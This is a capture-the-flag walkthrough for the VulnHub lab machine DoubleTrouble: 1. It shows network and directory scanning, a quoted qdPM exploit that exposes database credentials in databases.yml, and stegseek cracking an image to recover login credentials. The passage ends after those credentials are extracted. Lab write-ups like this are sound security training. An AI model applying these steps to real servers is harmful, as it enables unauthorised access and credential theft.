# DoubleTrouble: 1
https://www.vulnhub.com/entry/doubletrouble-1,743/

## Discovery

### Tool used: netdiscover
<br>

```
sudo netdiscover

Currently scanning: 192.168.148.0/16   |   Screen View: Unique Hosts          
                                                                               
 32 Captured ARP Req/Rep packets, from 18 hosts.   Total size: 1924            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.250.94   08:00:27:3a:15:61      2     120  PCS Systemtechnik GmbH
 ```

 ## Port scan

 ### Tool used: nmap
 <br>

 ```
 nmap -T4 -sV -p- dubtrub

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 10:24 CDT
Nmap scan report for dubtrub (172.16.250.94)
Host is up (0.00042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
```

## HTTP enumeration

### Tool used: gobuster
<br>

```
gobuster dir --url http://dubtrub --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dubtrub
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/07 10:27:31 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 304] [--> http://dubtrub/uploads/]
/images               (Status: 301) [Size: 303] [--> http://dubtrub/images/] 
/css                  (Status: 301) [Size: 300] [--> http://dubtrub/css/]    
/template             (Status: 301) [Size: 305] [--> http://dubtrub/template/]
/core                 (Status: 301) [Size: 301] [--> http://dubtrub/core/]    
/install              (Status: 301) [Size: 304] [--> http://dubtrub/install/] 
/js                   (Status: 301) [Size: 299] [--> http://dubtrub/js/]      
/sf                   (Status: 301) [Size: 299] [--> http://dubtrub/sf/]      
/secret               (Status: 301) [Size: 303] [--> http://dubtrub/secret/]  
/backups              (Status: 301) [Size: 304] [--> http://dubtrub/backups/] 
/batch                (Status: 301) [Size: 302] [--> http://dubtrub/batch/]   
/server-status        (Status: 403) [Size: 272]                               
                                                                              
===============================================================
2022/09/07 10:27:56 Finished
===============================================================
```

Browsing to the URL shows us qdPM 9.1 (a project management tool) is installed.<br><br>

![qdpm](./docs/doubletrouble/trouble_01_web.png)

Our first rabbit hole begins with the "/install" directory.<br><br>

![install1](./docs/doubletrouble/trouble_02_install01.png)

![install2](./docs/doubletrouble/trouble_03_install02.png)

A quick search of exploits shows us that we can expose some database credentials stored in a YAML (.yml) file:<br><br>

```
searchsploit -p 50176

  Exploit: qdPM 9.2 - Password Exposure (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50176
     Path: /usr/share/exploitdb/exploits/php/webapps/50176.txt
File Type: ASCII text

Copied EDB-ID #50176's path to the clipboard

cat 50176.txt 

# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

Indeed, if we browse to "~/core/config/databases.yml", we have a username and password:<br><br>

```yml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: otis
      password: "<?php echo urlencode('rush') ; ?>"
      attributes:
        quote_identifier: true  
```

We are able to go back to "/install" and login using **otis/rush** and reset the admin's password, but we were unable to login.<br><br>

![config](./docs/doubletrouble/trouble_04_config.png)

![loginfail](./docs/doubletrouble/trouble_05_loginfail.png)

We should have just inspected "/secret" first, as this is where we were able to progress from. The page contains a simple image. At first, it appeared to be nothing special as *exiftool* did not reveal anything good.<br><br>

![secret](./docs/doubletrouble/trouble_06_secret.png)

```
exiftool doubletrouble.jpg 

ExifTool Version Number         : 12.42
File Name                       : doubletrouble.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2022:09:07 10:30:12-05:00
File Access Date/Time           : 2022:09:07 10:30:12-05:00
File Inode Change Date/Time     : 2022:09:07 10:30:15-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 501
Image Height                    : 450
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 501x450
Megapixels                      : 0.225
```

However, after doing a quick search online for other people's work (because sometimes you get stuck), we found that steganography might be in play. Using *stegseek* revealed just that:<br><br>

```
stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt 

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"       
[i] Original filename: "creds.txt".
[i] Extracting to "doubletrouble.jpg.out".

cat doubletrouble.jpg.out 

otisrush@localhost.com
otis666
```